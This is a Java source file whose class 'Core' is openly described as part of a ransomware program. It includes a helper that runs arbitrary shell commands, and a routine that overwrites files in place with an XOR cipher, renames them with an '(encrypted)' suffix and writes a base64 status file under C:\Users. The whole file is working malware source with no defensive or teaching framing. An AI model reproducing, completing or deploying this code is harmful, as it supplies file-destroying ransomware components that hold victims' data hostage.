import java.io.BufferedReader;
import java.io.File;
import java.io.FileInputStream;
import java.io.FileNotFoundException;
import java.io.FileOutputStream;
import java.io.FileWriter;
import java.io.IOException;
import java.io.InputStreamReader;
import java.net.MalformedURLException;
import java.net.URL;
import java.net.URLConnection;
import java.nio.file.Files;
import java.nio.file.Paths;
import java.util.ArrayList;
import java.util.Base64;

/**
 * @author Amirreza Marzban
 */
class Core {

  /**
   * execute shell on OS
   * @param command for example: ping 8.8.8.8.
   * @param drive  if it will be null, function doesnt search for specific drivers
   * @return an output of shell
   */
  public static ArrayList<String> runCommand(String command, String drive) {
    ArrayList<String> arrayList = new ArrayList<>();
    Process runtime;
    try {
      if (drive != null) {
        runtime = Runtime.getRuntime().exec(command, null, new File(drive));
      } else {
        runtime = Runtime.getRuntime().exec(command);
      }
      BufferedReader inputStream = new BufferedReader(new InputStreamReader(runtime.getInputStream()));
      String s = "";
      while ((s = inputStream.readLine()) != null) {
        arrayList.add(s);
      }
    } catch (IOException e) {
      e.printStackTrace();
    }
    return arrayList;
  }

  /**
   * Read a file
   * @param path the file path
   * @return the file content
   */
  public static String readFile(String path) {
    StringBuilder output = new StringBuilder();
    try {
      Files.lines(Paths.get(path)).forEach(output::append);
    } catch (IOException e) {
      e.printStackTrace();
    }
    return output.toString();
  }

  /**
   * Check the internet connection
   * @return it is connect or disconnect
   */
  static boolean isInterneton() {
    try {
      URL url = new URL("http://www.google.com");
      URLConnection connection = url.openConnection();
      connection.connect();
      return true;
    } catch (MalformedURLException e) {
      System.out.println("connect your internet");
    } catch (IOException e) {
      System.out.println("connect your internet");
    }
    return false;
  }

  /**
   * write a file
   * @param path the file path
   * @param s the content
   */
  static void createFile(String path, int s) {
    try {
      FileWriter myWriter = new FileWriter(path);
      myWriter.write(Base64.getEncoder().encodeToString(String.valueOf(s).getBytes()));
      myWriter.close();
    } catch (IOException e) {
      e.printStackTrace();
    }
  }

  /**
   * Second heart of ransomware !!
   * @param file the file
   * @param key the specific key for enccryption or decryption
   * @param status the status of encryption or decryption
   */
  static void encryptFile(File file, int key, int status) {
    FileInputStream fileInputStream;
    FileOutputStream fileOutputStream;
    try {
      fileInputStream = new FileInputStream(file);
      byte[] data = new byte[fileInputStream.available()];
      fileInputStream.read(data);
      for (int i = 0; i < data.length; i++) {
        data[i] = (byte) (data[i] ^ key * 5);
      }
      fileOutputStream = new FileOutputStream(file);
      fileOutputStream.write(data);
      fileInputStream.close();
      fileOutputStream.close();
      if (status == 0) {
        createFile("C:\\Users\\status", 1);
        file.renameTo(new File(file.getAbsolutePath() + "(encrypted)"));
      } else {
        createFile("C:\\Users\\status", 0);
        file.renameTo(new File(file.getAbsolutePath().replace("(encrypted)", "")));
      }
    } catch (FileNotFoundException e) {
      e.printStackTrace();
    } catch (IOException e) {
      e.printStackTrace();
    }
  }
}
